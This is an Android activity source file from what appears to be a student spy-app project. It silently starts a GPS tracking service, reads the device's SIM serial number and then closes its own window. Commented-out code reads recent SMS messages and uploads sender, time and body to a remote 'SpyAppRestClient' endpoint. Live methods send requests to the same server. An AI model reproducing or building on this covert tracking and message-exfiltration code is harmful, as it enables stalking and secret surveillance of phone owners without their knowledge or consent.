package com.example.natalia.super_inzynierka;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.telephony.TelephonyManager;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import com.loopj.android.http.AsyncHttpResponseHandler;
import com.loopj.android.http.RequestParams;
import cz.msebera.android.httpclient.Header;

public class Start extends AppCompatActivity {

    private Button btnStartService;
    private Button btnStopService;
    public static String serialNumber;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_start);
        TelephonyManager telemamanger = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        serialNumber = telemamanger.getSimSerialNumber();
        System.out.println("MY NUMBER: " + serialNumber);

        btnStartService = (Button) findViewById(R.id.btnStartService);
        btnStopService = (Button) findViewById(R.id.btnStopService);
        Intent locationIntent = new Intent(this, LocationTrace.class);
        startService(locationIntent);

//        Intent serviceIntent = new Intent(this, TempService.class);
//        System.out.println("intent 1");
//        startService(serviceIntent);
//        System.out.println("start service intent");
        finish();
    }

//    private void initButtonsOnClick() {
//        View.OnClickListener listener = new View.OnClickListener() {
//            public void onClick(View v) {
//                switch (v.getId()) {
//                    case R.id.btnStartService:
//                        startMyService();
//                        break;
//                    case R.id.btnStopService:
//                        stopMyService();
//                        break;
//                    default:
//                        break;
//                }
//            }
//        };
//        btnStartService.setOnClickListener(listener);
//        btnStopService.setOnClickListener(listener);
//    }

//    public MyService m_service;
//    private ServiceConnection m_serviceConnection = new ServiceConnection() {
//        public void onServiceConnected(ComponentName className, IBinder service) {
//            m_service = ((MyService.MyBinder)service).getService();
//        }
//
//        public void onServiceDisconnected(ComponentName className) {
//            m_service = null;
//        }
//    };


    private void startMyService() {
//        Calendar cur_cal = Calendar.getInstance();
//        cur_cal.setTimeInMillis(System.currentTimeMillis());
//        cur_cal.add(Calendar.SECOND, 50);
//        Intent intent = new Intent(Start.this, MyService.class);
//        PendingIntent pintent = PendingIntent.getService(Start.this, 0, intent, 0);
//        AlarmManager alarm = (AlarmManager)getSystemService(Context.ALARM_SERVICE);
//        alarm.setRepeating(AlarmManager.RTC_WAKEUP, cur_cal.getTimeInMillis(), 30*1000, pintent);


//        Intent serviceIntent = new Intent(this, MyService.class);
//        startService(serviceIntent);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        System.out.println("onDestroy");
        TelephonyManager telemamanger = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        serialNumber = telemamanger.getSimSerialNumber();
//        startMyService();
//        Intent locationIntent = new Intent(this, LocationTrace.class);
//       startService(locationIntent);
    }

    @Override
    protected void onStop() {
        super.onStop();
        System.out.println("onStop");
        TelephonyManager telemamanger = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        serialNumber = telemamanger.getSimSerialNumber();
    }

    LocationManager locationManager;
    LocationListener locationListener = new LocationTrace();

    public void stopLocation() {
        System.out.println("STOPLOCATION");
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
        locationManager.removeUpdates(locationListener);
        locationManager = null;
        System.out.println("REMOVE UPDATES");
    }

    public void startLocation() {
        System.out.println("STARTLOCATION");
        locationManager = (LocationManager) getApplicationContext().getSystemService(Context.LOCATION_SERVICE);
        System.out.println("LOCATIONMANAGER");
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            System.out.println("check");
            return;
        }
        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 1000 * 10, 10, locationListener);
        System.out.println("LOCATIONMANAGER2");
    }

    @Override
    protected void onPause() {
        super.onPause();
        System.out.println("onPause");
        TelephonyManager telemamanger = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        serialNumber = telemamanger.getSimSerialNumber();
    }

    //    private void stopMyService() {
//        Intent serviceIntent = new Intent(this, MyService.class);
//        stopService(serviceIntent);
//    }


//    private ArrayList<String> smsList = new ArrayList<>();
//
//    public void Click() {
//        ContentResolver contentResolver = this.getContentResolver();
//        Uri SMS_INBOX = Uri.parse("content://sms/inbox");
//
//        Cursor cursor = contentResolver.query(SMS_INBOX, null, null, null, null);
//        System.out.println("C");
//        int indexBody = cursor.getColumnIndex(SmsReceiver.BODY);
//        int indexAddr = cursor.getColumnIndex(SmsReceiver.ADDRESS);
//        int indexDate = cursor.getColumnIndex(SmsReceiver.DATE);
//        System.out.println("D");
//        if (indexBody < 0 || !cursor.moveToFirst()) {
//            System.out.println("ret");
//            return;
//        }
//
//        smsList.clear();
//        System.out.println("clear");
//
//        do {
//            String date = cursor.getString(indexDate);
//            long d = Long.parseLong(date);
//
//            long millis = System.currentTimeMillis();
//            if (millis - d < 120000) {
//
//                Calendar calendar = Calendar.getInstance();
//                calendar.setTimeInMillis(d);
//
//                String min;
//                int mYear = calendar.get(Calendar.YEAR);
//                int mMonth = calendar.get(Calendar.MONTH);
//                int mDay = calendar.get(Calendar.DAY_OF_MONTH);
//                int hour = calendar.get(Calendar.HOUR_OF_DAY);
//                int minute = calendar.get(Calendar.MINUTE);
//                if (minute < 10) {
//                    min = "0" + minute;
//                } else {
//                    min = Integer.toString(minute);
//                }
//                String time = mDay + "-" + mMonth + "-" + mYear + "  " + hour + ":" + min;
//
//                String str = cursor.getString(indexAddr) + "\n" + time + "\n" + cursor.getString(indexBody);
//                smsList.add(str);
//            }
//
//
//        }
//        while (cursor.moveToNext());
//
//        for (int j = 0; j < smsList.size(); j++) {
//            try {
//                String[] splitted = smsList.get(j).split("\n");
//                String sender = splitted[0];
//                String time = splitted[1];
//                String encryptedData = "";
//                for (int i = 2; i < splitted.length; ++i) {
//                    encryptedData += splitted[i];
//                }
//                String data = sender + " : " + time + " : " + encryptedData;
//                Toast.makeText(this, data, Toast.LENGTH_SHORT).show();
//
//                postRequest(sender, time, encryptedData);
//            } catch (Exception e) {
//                e.printStackTrace();
//            }
//        }
//    }
//
//    public void postRequest(String number, String date, String text) {
//        RequestParams params = new RequestParams();
//        params.put("number", number);
//        params.put("start_time", date);
//        params.put("text", text);
//        SpyAppRestClient.post("create_message/", params, new AsyncHttpResponseHandler() {
//            @Override
//            public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
//            }
//
//            @Override
//            public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
//            }
//        });
//    }


    public void getRequest() {
        SpyAppRestClient.get("list_connect/", null, new AsyncHttpResponseHandler() {
            @Override
            public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
                if (responseBody == null) { /* empty response, alert something*/
                    return;
                }
                //success response, do something with it!
                String response = new String(responseBody);
                TextView displayTextView = (TextView) findViewById(R.id.text_super);
                displayTextView.setText(response);
            }

            @Override
            public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
                if (responseBody == null) { /* empty response, alert something*/
                    return;
                }
                //error response, do something with it!
                String response = new String(responseBody);
                TextView displayTextView = (TextView) findViewById(R.id.text_super);
                displayTextView.setText(response);
            }
        });
    }

    public void postRequest() {
        RequestParams params = new RequestParams();
        params.put("number", "123");
        params.put("start_time", "23:00");
        SpyAppRestClient.post("create_message/", params, new AsyncHttpResponseHandler() {
            @Override
            public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
                System.out.println("success");
            }

            @Override
            public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
                System.out.println("failure");
            }
        });

    }
//    Intent locationIntent;

//    public void start(View view) {
//        locationIntent = new Intent(this, LocationTrace.class);
//        startService(locationIntent);
//    }

//    public void stop(View view) {
//
//        stopService(locationIntent);
//
//    }
}
